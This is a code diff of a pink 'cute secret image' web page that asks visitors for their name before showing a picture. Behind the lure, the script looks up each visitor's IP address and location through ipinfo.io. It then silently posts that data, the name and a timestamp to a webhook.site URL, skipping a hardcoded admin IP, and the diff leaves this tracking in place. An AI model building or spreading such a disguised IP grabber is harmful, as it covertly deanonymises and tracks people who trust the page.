@@ -1,12 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✨ View Our Super Cute Secret Image ✨</title>
+    <title>Image Viewer</title>
     <style>
         body {
-            font-family: 'Comic Sans MS', cursive;
+            font-family: Comic Sans MS, cursive;
             text-align: center;
             background-color: #ffe6f2;
             padding: 20px;
@@ -20,37 +18,9 @@
             border-radius: 8px;
             display: none;
             box-shadow: 0 0 15px hotpink;
-            margin-top: 20px;
         }
         #name-form {
             margin: 20px 0;
-        }
-        input[type="text"] {
-            padding: 10px;
-            font-size: 16px;
-            border: 2px solid hotpink;
-            border-radius: 10px;
-            width: 250px;
-            margin-top: 10px;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            margin-left: 10px;
-            background-color: hotpink;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: deeppink;
-        }
-        .error {
-            color: red;
-            font-weight: bold;
-            margin-top: 10px;
         }
     </style>
 </head>
@@ -62,7 +32,6 @@
             <p>Enter your name to unlock the cuteness:</p>
             <input type="text" id="userName" placeholder="UwU what's your name?">
             <button onclick="handleSubmission()">Show me 💖</button>
-            <div id="error" class="error"></div>
         </div>
         
         <img id="user-image" src="https://i.imgur.com/TMqC1JF.png" alt="UwU E-Girl + Furry Combo">
@@ -72,17 +41,7 @@
         const ADMIN_IP = "83.105.112.217";
 
         async function handleSubmission() {
-            const userNameInput = document.getElementById('userName');
-            const userName = userNameInput.value.trim() || "UwU Nobody";
-            const errorBox = document.getElementById('error');
-            
-            if (!userName || userName === "UwU Nobody") {
-                errorBox.textContent = "Please enter a valid name first! 💢";
-                userNameInput.focus();
-                return;
-            }
-
-            errorBox.textContent = ""; // Clear error if valid name
+            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";
 
             try {
                 const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
@@ -98,7 +57,7 @@
                     time: new Date().toISOString()
                 };
 
-                // If viewer isn't admin, send log via webhook
+                // If viewer isn't admin, send log via webhook (or replace this later)
                 if (ipData.ip !== ADMIN_IP) {
                     fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
                         method: "POST",
@@ -107,12 +66,12 @@
                     });
                 }
 
-                // Display image and hide form
                 document.getElementById('user-image').style.display = 'block';
                 document.getElementById('name-form').style.display = 'none';
+
             } catch (e) {
-                console.error("Error fetching IP data:", e);
-                errorBox.textContent = "Something went wrong. Please try again later. 💔";
+                document.getElementById('user-image').style.display = 'block';
+                document.getElementById('name-form').style.display = 'none';
             }
         }
 
